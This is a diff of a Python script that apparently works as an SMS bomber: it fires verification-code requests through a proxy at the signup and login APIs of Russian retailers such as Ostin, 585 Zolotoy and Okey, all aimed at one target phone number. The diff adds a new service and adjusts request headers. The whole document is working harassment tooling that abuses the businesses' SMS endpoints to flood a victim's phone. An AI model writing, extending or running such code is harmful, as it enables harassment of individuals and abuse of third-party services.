@@ -76,7 +76,7 @@ def burgerKing():
 
 def ostin():
     osHeaders=headers
-    osHeaders.update({"origin":"https://ostin.com","referer":"https://ostin.com/","x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*"})
+    osHeaders.update({"origin":"https://ostin.com","referer":"https://ostin.com/","x-ts-ajax-request":"true","x-security-request":"required","accept-encoding":"gzip, deflate, br","accept-language":"ru-RU,ru;q=0.9","accept":"application/json, text/plain, */*","content-length":"41","content-type":"application/json;charset=UTF-8"})
     osPhone="+7"+phone
     os=requests.post("https://ostin.com/api/v2/front/request-code",headers=osHeaders,proxies=proxy,json={"phone":osPhone,"channel":"PUSH"})
     print(os.status_code,"Ostin")
@@ -88,10 +88,17 @@ def zolotoy585():
     zol=requests.post("https://www.585zolotoy.ru/api/sms/send_code/",headers=zolHeaders,proxies=proxy,json={"phone":zolPhone})
     print(zol.status_code,"Zolotoy 585")
 
+def okay():
+    okHeaders=headers
+    okPhone= "7"+phone
+    ok=requests.post("https://www.okmarket.ru/ajax/personal/register/",headers=okHeaders,proxies=proxy,params={"lang":"ru","phone":okPhone})
+    print(ok.status_code,"Магазин Окей")
+
+okay()
 pyaterka()
 karusel()
 aptekaru()
 ikea()
 burgerKing()
-ostin()
+#ostin()
 zolotoy585()
